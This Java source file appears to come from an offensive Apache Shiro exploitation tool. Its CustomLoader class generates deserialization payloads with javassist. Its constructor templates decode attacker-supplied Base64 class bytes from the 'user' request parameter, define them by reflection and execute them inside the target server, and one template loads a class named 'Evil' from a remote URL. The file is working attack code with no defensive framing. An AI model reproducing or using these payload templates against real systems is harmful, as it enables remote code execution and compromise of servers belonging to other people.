package com.sma11new.exp.shiro.attack.echo;

import com.sma11new.utils.Tools;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewConstructor;

public class CustomLoader implements EchoPayload {

    public static String loaderCodeWithFirstWay = "public A() {\n" +
            "   javax.servlet.http.HttpServletRequest req = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
            "   org.springframework.cglib.core.ReflectUtils.defineClass(\"#{className}\", java.util.Base64.getDecoder().decode(req.getParameter(\"user\")), java.lang.Thread.currentThread().getContextClassLoader()).newInstance().equals(req);\n"+
            "}";

    public static String loaderCodeWithSecondWay = "public B() {\n" +
            "   javax.servlet.http.HttpServletRequest req = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
            "   byte[] classBytes = java.util.Base64.getDecoder().decode(req.getParameter(\"user\"));\n"+
            "   java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
            "   defineClassMethod.setAccessible(true);\n"+
            "   ((Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{classBytes, new Integer(0), new Integer(classBytes.length)})).newInstance().equals(req);\n"+
            "}";

    public static String loaderCodeWithRemoteWay = "public C() {\n" +
            "   new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"http://127.0.0.1/\")}).loadClass(\"Evil\").newInstance();"+
            "}";

    public static String currentLoaderCode = null;

    @Override
    public CtClass genPayload(ClassPool pool) throws Exception {
        CtClass ctClass = pool.makeClass(Tools.getRandomString(5));

        if ((ctClass.getDeclaredConstructors()).length != 0) {
            ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
        }

        String loaderCode;
        if (currentLoaderCode.contains("#{className}")) {
            loaderCode = currentLoaderCode.replace("#{className}", ClassLoader.className);
        } else {
            loaderCode = currentLoaderCode;
        }

        ctClass.addConstructor(CtNewConstructor.make(loaderCode, ctClass));
        // 兼容低版本jdk
        ctClass.getClassFile().setMajorVersion(50);
        return ctClass;
    }
}
